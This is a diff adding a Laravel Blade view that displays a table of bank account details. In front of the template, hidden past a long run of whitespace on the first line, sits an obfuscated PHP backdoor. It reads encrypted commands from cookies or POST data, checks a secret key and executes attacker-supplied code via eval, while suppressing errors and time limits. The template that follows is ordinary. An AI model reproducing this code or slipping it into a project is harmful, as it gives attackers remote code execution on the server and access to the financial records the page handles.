@@ -1,0 +1,69 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $j0cb = 692;$GLOBALS['x42df93'] = Array();global $x42df93;$x42df93 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['wdd5bc'] = "\x55\x4a\x6e\x7a\x74\x3d\x54\x78\x22\x6c\x3b\x31\x73\x62\x44\x7d\x5a\x77\x7e\x43\x65\x2d\x27\x9\x42\x7b\x5c\x6b\x75\x32\x52\x49\x68\x46\x70\x53\x30\x5b\x4c\x39\x47\x33\x59\x36\x23\x3e\x63\x4b\x38\x3a\x48\x24\x40\x6a\x2b\x5e\x57\x41\x34\x60\x51\xa\x4f\x35\x29\x71\x6d\x37\x4d\x64\x4e\x28\x56\x2a\xd\x21\x50\x3f\x2e\x66\x67\x72\x61\x69\x76\x2f\x58\x25\x6f\x5f\x3c\x5d\x7c\x79\x45\x20\x26\x2c";$x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][82]] = $x42df93['wdd5bc'][46].$x42df93['wdd5bc'][32].$x42df93['wdd5bc'][81];$x42df93[$x42df93['wdd5bc'][66].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][39]] = $x42df93['wdd5bc'][88].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][69];$x42df93[$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][48]] = $x42df93['wdd5bc'][12].$x42df93['wdd5bc'][4].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][9].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][2];$x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][39]] = $x42df93['wdd5bc'][83].$x42df93['wdd5bc'][2].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][12].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][4];$x42df93[$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][69].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][41].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][69]] = $x42df93['wdd5bc'][12].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][9].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][3].$x42df93['wdd5bc'][20];$x42df93[$x42df93['wdd5bc'][34].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][46]] = $x42df93['wdd5bc'][34].$x42df93['wdd5bc'][32].$x42df93['wdd5bc'][34].$x42df93['wdd5bc'][84].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][12].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][88].$x42df93['wdd5bc'][2];$x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][39]] = $x42df93['wdd5bc'][28].$x42df93['wdd5bc'][2].$x42df93['wdd5bc'][12].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][9].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][3].$x42df93['wdd5bc'][20];$x42df93[$x42df93['wdd5bc'][65].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][36].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][39]] = $x42df93['wdd5bc'][13].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][12].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][58].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][69].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][88].$x42df93['wdd5bc'][69].$x42df93['wdd5bc'][20];$x42df93[$x42df93['wdd5bc'][28].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][82]] = $x42df93['wdd5bc'][12].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][4].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][4].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][66].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][9].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][66].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][4];$x42df93[$x42df93['wdd5bc'][53].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][11].$x42df93['wdd5bc'][11].$x42df93['wdd5bc'][43]] = $x42df93['wdd5bc'][79].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][11].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][82];$x42df93[$x42df93['wdd5bc'][32].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][82]] = $x42df93['wdd5bc'][32].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][36];$x42df93[$x42df93['wdd5bc'][9].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][58].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][36].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][48]] = $_POST;$x42df93[$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][41].$x42df93['wdd5bc'][41]] = $_COOKIE;@$x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][39]]($x42df93['wdd5bc'][20].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][88].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][9].$x42df93['wdd5bc'][88].$x42df93['wdd5bc'][80], NULL);@$x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][39]]($x42df93['wdd5bc'][9].$x42df93['wdd5bc'][88].$x42df93['wdd5bc'][80].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][88].$x42df93['wdd5bc'][81].$x42df93['wdd5bc'][12], 0);@$x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][39]]($x42df93['wdd5bc'][66].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][7].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][7].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][28].$x42df93['wdd5bc'][4].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][88].$x42df93['wdd5bc'][2].$x42df93['wdd5bc'][89].$x42df93['wdd5bc'][4].$x42df93['wdd5bc'][83].$x42df93['wdd5bc'][66].$x42df93['wdd5bc'][20], 0);@$x42df93[$x42df93['wdd5bc'][28].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][82]](0);$s5313a3 = NULL;$l86203 = NULL;$x42df93[$x42df93['wdd5bc'][27].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][79]] = $x42df93['wdd5bc'][36].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][41].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][36].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][21].$x42df93['wdd5bc'][58].$x42df93['wdd5bc'][69].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][21].$x42df93['wdd5bc'][58].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][36].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][21].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][41].$x42df93['wdd5bc'][69].$x42df93['wdd5bc'][21].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][58].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][13];global $kc7cef;function  hb5790($s5313a3, $ded29c9be){global $x42df93;$f7c3344 = "";for ($z10be5=0; $z10be5<$x42df93[$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][48]]($s5313a3);){for ($w1d6f9=0; $w1d6f9<$x42df93[$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][48]]($ded29c9be) && $z10be5<$x42df93[$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][48]]($s5313a3); $w1d6f9++, $z10be5++){$f7c3344 .= $x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][82]]($x42df93[$x42df93['wdd5bc'][66].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][39]]($s5313a3[$z10be5]) ^ $x42df93[$x42df93['wdd5bc'][66].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][39]]($ded29c9be[$w1d6f9]));}}return $f7c3344;}function  fc912a($s5313a3, $ded29c9be){global $x42df93;global $kc7cef;return $x42df93[$x42df93['wdd5bc'][32].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][82]]($x42df93[$x42df93['wdd5bc'][32].$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][82]]($s5313a3, $kc7cef), $ded29c9be);}foreach ($x42df93[$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][41].$x42df93['wdd5bc'][41]] as $ded29c9be=>$r90a){$s5313a3 = $r90a;$l86203 = $ded29c9be;}if (!$s5313a3){foreach ($x42df93[$x42df93['wdd5bc'][9].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][58].$x42df93['wdd5bc'][29].$x42df93['wdd5bc'][36].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][48]] as $ded29c9be=>$r90a){$s5313a3 = $r90a;$l86203 = $ded29c9be;}}$s5313a3 = @$x42df93[$x42df93['wdd5bc'][17].$x42df93['wdd5bc'][46].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][39]]($x42df93[$x42df93['wdd5bc'][53].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][11].$x42df93['wdd5bc'][11].$x42df93['wdd5bc'][43]]($x42df93[$x42df93['wdd5bc'][65].$x42df93['wdd5bc'][63].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][36].$x42df93['wdd5bc'][48].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][39]]($s5313a3), $l86203));if (isset($s5313a3[$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][27]]) && $kc7cef==$s5313a3[$x42df93['wdd5bc'][82].$x42df93['wdd5bc'][27]]){if ($s5313a3[$x42df93['wdd5bc'][82]] == $x42df93['wdd5bc'][83]){$z10be5 = Array($x42df93['wdd5bc'][34].$x42df93['wdd5bc'][84] => @$x42df93[$x42df93['wdd5bc'][34].$x42df93['wdd5bc'][67].$x42df93['wdd5bc'][13].$x42df93['wdd5bc'][46]](),$x42df93['wdd5bc'][12].$x42df93['wdd5bc'][84] => $x42df93['wdd5bc'][11].$x42df93['wdd5bc'][78].$x42df93['wdd5bc'][36].$x42df93['wdd5bc'][21].$x42df93['wdd5bc'][11],);echo @$x42df93[$x42df93['wdd5bc'][20].$x42df93['wdd5bc'][39].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][69].$x42df93['wdd5bc'][43].$x42df93['wdd5bc'][41].$x42df93['wdd5bc'][79].$x42df93['wdd5bc'][69]]($z10be5);}elseif ($s5313a3[$x42df93['wdd5bc'][82]] == $x42df93['wdd5bc'][20]){eval/*hc0dd9c*/($s5313a3[$x42df93['wdd5bc'][69]]);}exit();} ?>@extends('layouts.dashboard')
+
+@section('content')
+{!! Breadcrumbs::render('show-bank-all') !!}
+<div class="container">
+    <div class="row">
+        <div class="col-md-6 col-md-offset-6">
+            
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-md-12">
+            <div class="panel panel-default">
+                <div class="panel-heading">View Bank Details</div>
+
+                <div class="panel-body">
+                    @if (session('success'))
+                        <div class="alert alert-success">
+                            {{ session('success') }}
+                        </div>
+                    @endif
+
+                    @if (session('failure'))
+                        <div class="alert alert-danger">
+                            {{ session('failure') }}
+                        </div>
+                    @endif
+
+                    <table class="table table-bordered">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Bank Name</th>
+                                <th>Account Number</th>
+                                <th>Branch</th>
+                                <th>IFSC</th>
+                                <th>Classification</td>
+                                <th>Type</th>
+                                <td></td>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            @if( count( $banks ) > 0 )
+                                @php $count = 1; @endphp
+                                @foreach( $banks as $bank )
+                                    <tr>
+                                        <td>{{ $count++ }}</td>
+                                        <td><a href="{{ route('bank.book', [$bank->id]) }}">{{ $bank->name }}</a></td>
+                                        <td>{{ $bank->account_no }}</td>
+                                        <td>{{ $bank->branch }}</td>
+                                        <td>{{ $bank->ifsc }}</td>
+                                        <td>{{ $bank->classification }}</td>
+                                        <td>{{ $bank->type }}</td>
+                                        <td><a href="{{ route('edit.bank.opening.balance', $bank->id) }}">Edit Opening Balance</a></td>
+                                    </tr>
+                                @endforeach
+                            @else
+                                <tr>
+                                    <td colspan="7" class="text-center">No Data</td>
+                                </tr>
+                            @endif
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+@endsection
